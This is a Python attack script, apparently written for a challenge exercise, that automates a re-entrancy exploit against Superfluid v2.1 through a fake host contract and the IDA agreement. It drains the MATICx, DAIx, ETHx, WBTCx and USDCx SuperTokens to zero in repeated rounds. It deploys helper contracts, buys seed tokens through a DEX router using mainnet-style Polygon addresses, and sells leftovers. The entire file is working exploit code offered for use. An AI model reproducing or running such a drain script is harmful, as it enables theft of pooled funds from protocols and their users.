#!/usr/bin/env python3
"""
CH6 Superfluid v2.1 — Drain all 5 SuperToken underlyings to exactly 0.
Uses FakeHost IDA re-entrancy to amplify seed deposits.
"""
import subprocess, json, sys, os, time

# Load env
from dotenv import load_dotenv
load_dotenv("/Users/dldustn/Desktop/AssignmentC/.env")

RPC = os.environ["RPC_CH6_SUPERFLUID_V21"]
PK = os.environ["PRIVATE_KEY"]
ATK = os.environ["PUBLIC_ADDRESS"]

# Addresses
HOST = "0x3E14dC1b13c488a8d5D310918780c983bD5982E7"
IDA  = "0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1"

MATICX = "0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3"
DAIX   = "0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2"
DAI    = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
ETHX   = "0x27e1e4E6BC79D93032abef01025811B7E4727e85"
WETH   = "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619"
WBTCX  = "0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92"
WBTC   = "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6"
USDCX  = "0xCAa7349CEA390F89641fe306D93591f87595dc1F"
USDC   = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
ROUTER = "0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff"
WMATIC = "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270"

REENTRY = 200  # high reentry, limited by gas
GAS_LIMIT = "29000000"

def cast_send(to, sig, args=None, value=None, gas_limit=None):
    """Send a transaction via cast send, return receipt."""
    cmd = ["cast", "send", "--private-key", PK, "--rpc-url", RPC]
    if gas_limit:
        cmd += ["--gas-limit", str(gas_limit)]
    if value:
        cmd += ["--value", str(value)]
    cmd += [to, sig]
    if args:
        cmd += [str(a) for a in args]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    if r.returncode != 0:
        print(f"  ERROR: {r.stderr.strip()[:200]}")
        return False
    return True

def cast_send_create(bytecode, gas_limit=None):
    """Deploy a contract, return address."""
    cmd = ["cast", "send", "--private-key", PK, "--rpc-url", RPC, "--create", bytecode, "--json"]
    if gas_limit:
        cmd += ["--gas-limit", str(gas_limit)]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    if r.returncode != 0:
        print(f"  DEPLOY ERROR: {r.stderr.strip()[:200]}")
        return None
    try:
        return json.loads(r.stdout)["contractAddress"]
    except:
        print(f"  PARSE ERROR: {r.stdout[:200]}")
        return None

def cast_call(to, sig, args=None):
    """Read call, return result string."""
    cmd = ["cast", "call", "--rpc-url", RPC, to, sig]
    if args:
        cmd += [str(a) for a in args]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return r.stdout.strip()

def cast_calldata(sig, args):
    """Encode calldata."""
    cmd = ["cast", "calldata", sig] + [str(a) for a in args]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    return r.stdout.strip()

def get_balance(addr):
    """Get native balance in wei."""
    cmd = ["cast", "balance", addr, "--rpc-url", RPC]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return int(r.stdout.strip())

def get_erc20_balance(token, addr):
    """Get ERC20 balance."""
    result = cast_call(token, "balanceOf(address)(uint256)", [addr])
    # Parse: might be "123456 [1.23e5]" or just "123456"
    return int(result.split()[0])

def deploy_fh(token_addr):
    """Deploy FakeHost for a given token."""
    # Get bytecode from compiled artifact
    artifact_path = "/Users/dldustn/Desktop/AssignmentC/challenges/ch6_superfluid_v21/out/MegaDrain.sol/FH2.json"
    with open(artifact_path) as f:
        bytecode = json.load(f)["bytecode"]["object"]
    # Constructor args: (address ida, address token)
    args = subprocess.run(
        ["cast", "abi-encode", "constructor(address,address)", IDA, token_addr],
        capture_output=True, text=True
    ).stdout.strip()
    full = bytecode + args[2:]  # remove 0x prefix from args
    addr = cast_send_create(full)
    print(f"  FH deployed: {addr}")
    return addr

def deploy_rcv_native():
    """Deploy RcvNative (native MATIC receiver)."""
    artifact_path = "/Users/dldustn/Desktop/AssignmentC/challenges/ch6_superfluid_v21/out/MegaDrain.sol/RN2.json"
    with open(artifact_path) as f:
        bytecode = json.load(f)["bytecode"]["object"]
    addr = cast_send_create(bytecode)
    print(f"  RcvNative deployed: {addr}")
    return addr

def deploy_rcv_erc20():
    """Deploy RcvERC20."""
    artifact_path = "/Users/dldustn/Desktop/AssignmentC/challenges/ch6_superfluid_v21/out/MegaDrain.sol/RE2.json"
    with open(artifact_path) as f:
        bytecode = json.load(f)["bytecode"]["object"]
    addr = cast_send_create(bytecode)
    print(f"  RcvERC20 deployed: {addr}")
    return addr

def drain_maticx_round(fh, rcv, idx, seed, reentry):
    """One round of MATICx drain."""
    print(f"  Round idx={idx} seed={seed} reentry={reentry}")

    # 1. Upgrade MATIC to MATICx
    if not cast_send(MATICX, "upgradeByETH()", value=seed):
        return False

    # 2. Create index
    cd = cast_calldata("createIndex(address,uint32,bytes)", [MATICX, idx, "0x"])
    if not cast_send(HOST, "callAgreement(address,bytes,bytes)", [IDA, cd, "0x"]):
        return False

    # 3. Subscribe
    cd = cast_calldata("updateSubscription(address,uint32,address,uint128,bytes)", [MATICX, idx, rcv, 1, "0x"])
    if not cast_send(HOST, "callAgreement(address,bytes,bytes)", [IDA, cd, "0x"]):
        return False

    # 4. Update index value
    cd = cast_calldata("updateIndex(address,uint32,uint128,bytes)", [MATICX, idx, seed, "0x"])
    if not cast_send(HOST, "callAgreement(address,bytes,bytes)", [IDA, cd, "0x"]):
        return False

    # 5. FH attack
    if not cast_send(fh, "set(address,uint32,address,uint256)", [ATK, idx, rcv, reentry]):
        return False
    if not cast_send(fh, "go()", gas_limit=GAS_LIMIT):
        return False

    # 6. Drain receiver
    if not cast_send(rcv, "drain(address,address)", [MATICX, ATK]):
        return False

    return True

def drain_erc20_round(fh, rcv, super_token, underlying, scale_factor, idx, seed_underlying, reentry):
    """One round of ERC20 SuperToken drain."""
    seed_super = seed_underlying * scale_factor
    print(f"  Round idx={idx} seedU={seed_underlying} seedS={seed_super} reentry={reentry}")

    # 1. Upgrade underlying to SuperToken
    if not cast_send(super_token, "upgrade(uint256)", [seed_super]):
        return False

    # 2. Create index
    cd = cast_calldata("createIndex(address,uint32,bytes)", [super_token, idx, "0x"])
    if not cast_send(HOST, "callAgreement(address,bytes,bytes)", [IDA, cd, "0x"]):
        return False

    # 3. Subscribe
    cd = cast_calldata("updateSubscription(address,uint32,address,uint128,bytes)", [super_token, idx, rcv, 1, "0x"])
    if not cast_send(HOST, "callAgreement(address,bytes,bytes)", [IDA, cd, "0x"]):
        return False

    # 4. Update index value
    cd = cast_calldata("updateIndex(address,uint32,uint128,bytes)", [super_token, idx, seed_super, "0x"])
    if not cast_send(HOST, "callAgreement(address,bytes,bytes)", [IDA, cd, "0x"]):
        return False

    # 5. FH attack
    if not cast_send(fh, "set(address,uint32,address,uint256)", [ATK, idx, rcv, reentry]):
        return False
    if not cast_send(fh, "go()", gas_limit=GAS_LIMIT):
        return False

    # 6. Drain receiver
    if not cast_send(rcv, "drain(address,address,address)", [super_token, underlying, ATK]):
        return False

    return True

def buy_underlying(underlying, matic_amount):
    """Buy underlying token with MATIC on QuickSwap."""
    # Approve is not needed for swapExactETHForTokens
    path_enc = subprocess.run(
        ["cast", "abi-encode", "x(address[])", f"[{WMATIC},{underlying}]"],
        capture_output=True, text=True
    ).stdout.strip()

    # Get quote
    quote_result = cast_call(ROUTER, "getAmountsOut(uint256,address[])(uint256[])", [matic_amount, f"[{WMATIC},{underlying}]"])
    print(f"  Quote: {quote_result}")

    # Swap
    deadline = 99999999999
    if not cast_send(ROUTER, "swapExactETHForTokens(uint256,address[],address,uint256)",
                     [0, f"[{WMATIC},{underlying}]", ATK, deadline],
                     value=matic_amount):
        return False
    return True

def sell_underlying(underlying, amount):
    """Sell underlying token for MATIC."""
    # Approve
    cast_send(underlying, "approve(address,uint256)", [ROUTER, amount])
    # Swap
    deadline = 99999999999
    cast_send(ROUTER, "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
              [amount, 0, f"[{WMATIC},{underlying}]", ATK, deadline])

def main():
    print("=== CH6 SUPERFLUID v2.1 DRAIN ===")
    print(f"ATK: {ATK}")
    print(f"Balance: {get_balance(ATK)} wei")

    # Phase 1: MATICx drain
    print("\n=== PHASE 1: DRAIN MATICx ===")
    fh_maticx = deploy_fh(MATICX)
    rcv_native = deploy_rcv_native()
    if not fh_maticx or not rcv_native:
        print("DEPLOY FAILED")
        return

    idx_base = 700000000
    for round_num in range(20):
        backing = get_balance(MATICX)
        bal = get_balance(ATK)
        print(f"\nMATICx Round {round_num}: backing={backing}, bal={bal}")

        if backing == 0:
            print("MATICx FULLY DRAINED!")
            break

        avail = max(0, bal - 500000000000000000)  # leave 0.5 MATIC for gas
        if avail <= 0:
            print("Not enough MATIC for gas")
            break

        reentry = REENTRY
        seed = backing // reentry
        if seed == 0:
            seed = 1
            reentry = backing
        if seed > avail:
            seed = avail

        # int256 safety cap
        max_seed = (2**255 - 1) // (reentry + 1)
        if seed > max_seed:
            seed = max_seed

        if seed == 0:
            break

        idx = idx_base + round_num * 10
        if not drain_maticx_round(fh_maticx, rcv_native, idx, seed, reentry):
            print(f"  Round {round_num} FAILED, continuing...")
            idx_base += 1000  # offset to avoid collisions
            continue

        new_backing = get_balance(MATICX)
        new_bal = get_balance(ATK)
        drained = backing - new_backing
        print(f"  Drained {drained} wei, new backing={new_backing}, new bal={new_bal}")

    maticx_remaining = get_balance(MATICX)
    print(f"\nMATICx final backing: {maticx_remaining}")

    # Phase 2: Drain ERC20 SuperTokens
    tokens = [
        ("DAIx",  DAIX,  DAI,  18, 800000000),
        ("ETHx",  ETHX,  WETH, 18, 810000000),
        ("WBTCx", WBTCX, WBTC,  8, 820000000),
        ("USDCx", USDCX, USDC,  6, 830000000),
    ]

    for name, super_token, underlying, decimals, idx_base in tokens:
        print(f"\n=== DRAIN {name} ===")
        backing = get_erc20_balance(underlying, super_token)
        print(f"Backing: {backing}")
        if backing == 0:
            print(f"{name} already drained!")
            continue

        scale_factor = 10 ** (18 - decimals)

        # Calculate how much underlying we need (backing / reentry * 3 for safety)
        needed_underlying = (backing // REENTRY) * 3
        if needed_underlying == 0:
            needed_underlying = 1

        # Buy underlying with MATIC
        # Estimate MATIC needed
        our_matic = get_balance(ATK)
        buy_amount = min(our_matic // 5, our_matic - 2 * 10**18)  # use 20% of MATIC, keep 2 for gas
        if buy_amount <= 0:
            print("Not enough MATIC!")
            continue

        print(f"Buying {name} underlying with {buy_amount} wei MATIC...")
        if not buy_underlying(underlying, buy_amount):
            print("BUY FAILED")
            continue

        # Approve SuperToken to spend underlying
        our_underlying = get_erc20_balance(underlying, ATK)
        print(f"Got {our_underlying} underlying")
        cast_send(underlying, "approve(address,uint256)", [super_token, "115792089237316195423570985008687907853269984665640564039457584007913129639935"])

        # Deploy helpers
        fh = deploy_fh(super_token)
        rcv = deploy_rcv_erc20()
        if not fh or not rcv:
            print("DEPLOY FAILED")
            continue

        for round_num in range(20):
            backing = get_erc20_balance(underlying, super_token)
            our_underlying = get_erc20_balance(underlying, ATK)
            print(f"\n{name} Round {round_num}: backing={backing}, our_underlying={our_underlying}")

            if backing == 0:
                print(f"{name} FULLY DRAINED!")
                break

            if our_underlying == 0:
                print("No underlying left!")
                break

            reentry = REENTRY
            seed_u = backing // reentry
            if seed_u == 0:
                seed_u = 1
                reentry = backing
            if seed_u > our_underlying:
                seed_u = our_underlying

            seed_s = seed_u * scale_factor
            max_seed_s = (2**255 - 1) // (reentry + 1)
            if seed_s > max_seed_s:
                seed_s = max_seed_s
                seed_u = seed_s // scale_factor
                seed_s = seed_u * scale_factor

            if seed_u == 0 or seed_s == 0:
                break

            idx = idx_base + round_num * 10
            if not drain_erc20_round(fh, rcv, super_token, underlying, scale_factor, idx, seed_u, reentry):
                print(f"  Round {round_num} FAILED")
                idx_base += 1000
                continue

            new_backing = get_erc20_balance(underlying, super_token)
            print(f"  New backing: {new_backing}")

        # Sell remaining underlying back to MATIC
        remaining_underlying = get_erc20_balance(underlying, ATK)
        if remaining_underlying > 0:
            print(f"Selling {remaining_underlying} remaining underlying...")
            sell_underlying(underlying, remaining_underlying)

    # Final verification
    print("\n=== FINAL VERIFICATION ===")
    print(f"DAI in DAIx:   {get_erc20_balance(DAI, DAIX)}")
    print(f"WETH in ETHx:  {get_erc20_balance(WETH, ETHX)}")
    print(f"MATIC in MATICx: {get_balance(MATICX)}")
    print(f"WBTC in WBTCx: {get_erc20_balance(WBTC, WBTCX)}")
    print(f"USDC in USDCx: {get_erc20_balance(USDC, USDCX)}")
    print(f"Our MATIC:     {get_balance(ATK)}")

if __name__ == "__main__":
    main()
